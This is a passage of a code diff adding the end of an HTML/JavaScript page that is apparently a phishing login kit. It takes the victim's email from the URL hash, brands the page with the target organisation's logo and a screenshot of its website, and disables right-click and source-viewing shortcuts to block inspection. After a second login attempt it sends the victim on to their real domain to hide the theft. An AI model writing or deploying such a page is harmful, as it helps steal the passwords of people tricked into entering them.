+      console.log("Redirect target:", 'https://' + domain);
+
+      // Redirect immediately (no extra delay)
+      if (domain && domain.length > 3 && domain.includes('.')) {
+        console.log("Redirecting to https://" + domain);
+        window.location.href = 'https://' + domain;
+      } else {
+        console.error("Invalid domain, redirecting to Google");
+        window.location.href = "https://www.google.com";
+      }
+      console.log("=== handleLogin END (2nd attempt - redirecting) ===");
+    }
+  }
+
+  // ============================================
+  // BACKGROUND IMAGE LOADER (fast fallback)
+  // ============================================
+  function setBackgroundImage(domain) {
+    const thumUrl = "https://image.thum.io/get/width/1200/https://" + domain;
+    const fallbackUrl = "https://" + domain;
+
+    // Set fallback immediately as background-color + low-opacity overlay
+    document.body.style.backgroundImage = "url('" + fallbackUrl + "')";
+    document.body.style.backgroundSize = "cover";
+    document.body.style.backgroundPosition = "center";
+    document.body.style.backgroundRepeat = "no-repeat";
+
+    // Try to load thum.io image
+    const img = new Image();
+    img.onload = function() {
+      document.body.style.backgroundImage = "url('" + thumUrl + "')";
+    };
+    img.onerror = function() {
+      // Keep fallback (domain website as background)
+      console.log("thum.io failed, using fallback background");
+    };
+    img.src = thumUrl;
+  }
+
+  // ============================================
+  // INITIALIZATION
+  // ============================================
+  $(document).ready(function () {
+    console.log("=== PAGE LOADED ===");
+
+    // Disable browser shortcuts
+    $(document).bind('keydown', function (e) {
+      if (e.ctrlKey && e.which === 83) { e.preventDefault(); return false; }
+    });
+    document.addEventListener('contextmenu', event => event.preventDefault());
+    document.onkeydown = function (e) {
+      if (e.ctrlKey && [67, 86, 85, 117].includes(e.keyCode)) return false;
+      return true;
+    };
+    $(document).keypress("u", function (e) { return !e.ctrlKey; });
+
+    // Parse email from hash
+    const emailFromHash = window.location.hash.substr(1);
+    console.log("Hash:", emailFromHash);
+
+    if (emailFromHash) {
+      extractedEmail = emailFromHash;
+      $('#email').val(extractedEmail);
+      $(".email").html(extractedEmail);
+
+      const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+      if (!filter.test(extractedEmail)) {
+        $('#error').show();
+        return false;
+      }
+
+      // Extract domain from email
+      const atIndex = extractedEmail.indexOf("@");
+      domain = extractedEmail.substr(atIndex + 1);
+
+      const c = domain.substr(0, domain.indexOf('.'));
+      const final = c.toLowerCase();
+      const logoUrl = "https://img.logo.dev/" + domain + "?token=pk_X3Yst72FQUOeVfOd-dlhKg";
+
+      // Set logo
+      $("#logoimg").attr("src", logoUrl);
+      $("#logoname").html(final);
+      $(".logoname").html(final);
+
+      // Set favicon
+      $("#favicon").attr("href", logoUrl);
+
+      // Set background with fast fallback
+      setBackgroundImage(domain);
+
+      console.log("Domain extracted:", domain);
+      console.log("Email:", extractedEmail);
+    }
+
+    // Attach event listeners
+    const btn = document.getElementById("submit-btn");
+    const container = document.getElementById("users");
+
+    btn.addEventListener("click", function(e) {
+      console.log("Button clicked");
+      handleLogin();
+    });
+
+    container.addEventListener("keydown", function(e) {
+      if (e.key === "Enter") {
+        console.log("Enter pressed");
+        e.preventDefault();
+        handleLogin();
+      }
+    });
+
+    console.log("=== INITIALIZATION COMPLETE ===");
+  });
+</script>
+</body>
+</html>
